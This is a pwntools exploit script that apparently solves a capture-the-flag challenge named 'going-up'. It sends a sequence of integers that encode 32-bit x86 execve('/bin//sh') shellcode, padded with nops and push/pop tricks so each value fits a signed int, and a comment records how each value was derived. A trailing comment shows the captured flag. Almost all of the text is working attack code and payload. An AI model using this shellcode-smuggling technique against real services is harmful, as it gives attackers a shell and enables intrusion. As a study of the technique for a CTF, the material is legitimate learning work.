from pwn import *

HOST = args.HOST or '192.168.20.1'
PORT = int(args.PORT or 5280+6)
EXE_FILENAME = '../going-up'

exe = context.binary = ELF(EXE_FILENAME)
argv = [EXE_FILENAME]
envp = {}

def start():
    if args.REMOTE:
        return remote(HOST,PORT)
    return process(argv=argv, env=envp)

"""
------
Legend: * == added instruction to original code
------

   xor    eax, eax
   *inc    ebx
   *nop
   N = -1874608079

   *nop
   *nop
   push   eax
   *nop
   N = -1873768304
   
   *nop
   push   0x68732f2f
   push   0x6e69622f
   *inc    ebx
   N = 791636112
   N = 795371635
   N = 1131309410
   
   mov    ebx, esp
   push   eax
   push   ebx
   N = 1397810057
   
   *nop
   mov    ecx, esp
   *push   ebx --> can't pop here, otherwise I get too big value 1541507472 and also ruin stack
   N = 1407289744

   *nop
   mov    al, 0xb
   *pop    ebx --> for the same reason of above, can't push here, but can pop the "mock" value
   N = 1527492752

   *nop
   int    0x80
   *pop ebx --> can't nop, otherwise overflow; here don't mind about ruining stack since exec is already done
   N = 1535167888
   
   
--- Not feasiable (last two needed to be rearranged to have int <= 2147483647, otherwise overflow)
   mov    al, 0xb
   pop    ebx
   nop
   N = 2421885872

   int    0x80
   nop
   nop
   N = 2425389261
--------------------------------------------------------------------
"""

io = start()
integers = [-1874608079, -1873768304, 791636112, 795371635, 1131309410, 1397810057, 1407289744, 1527492752, 1535167888, -1]


for i in integers:
    #print(i)
    io.recvuntil(b'stop): ')
    io.sendline(str(i).encode())

io.interactive()

'''
$ cat flag.txt
BASC{ggWP_I_C_U_sorted_it_0uT}
'''
